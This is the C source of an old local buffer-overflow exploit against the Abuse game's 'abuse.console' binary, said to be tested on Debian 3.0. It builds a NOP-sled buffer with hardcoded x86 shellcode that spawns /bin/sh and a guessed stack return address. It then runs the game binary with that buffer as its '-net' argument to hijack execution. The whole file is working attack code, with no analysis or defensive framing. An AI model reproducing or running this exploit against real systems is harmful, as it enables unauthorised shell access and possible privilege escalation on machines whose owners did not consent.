	 /*          Abuse.console version 2.0 Exploit           */
	/*            By Girish<girish@mec.ac.in>                

                     <Tested on Debian 3.0 woody>                */

#include<stdio.h>
#define RET 0xbffff55a
#define LEN 980
#define NOP 0x90

static char shellcode[]=
	"\xeb\x1f\x5e\x89\x76\x08\x31\xc0\x88\x46\x07\x89\x46\x0c\xb0\x0b"
        "\x89\xf3\x8d\x4e\x08\x8d\x56\x0c\xcd\x80\x31\xdb\x89\xd8\x40\xcd"
        "\x80\xe8\xdc\xff\xff\xff/bin/sh";


long esp(void)
{
	__asm("movl %esp,%eax");
}

void  main(int argc,char *argv[])
{
	
	char cmd[1000];
	int i,x;
	long  retn;
	char buff[LEN];
	
	
	printf("\nUsage :- %s <offset>\n..",argv[0]);
	
	if(argc>1)
		retn=esp()-atoi(argv[1]);
	else
		retn=RET;

	printf("Using return Adress :- ",retn );

	for(i=0;i<LEN;i+=4)
	{
		*(long*)&buff[i]=retn;
	}

	for(i=0;i<(LEN-(strlen(shellcode)+8));i++)
	{
		*(buff+i)=NOP;

	}

	memcpy(buff+i,shellcode,strlen(shellcode));

	sprintf(cmd,"/usr/lib/games/abuse/abuse.console -net %s",buff);

	puts("executing .......");
	
	system(cmd);
	
	return;
}


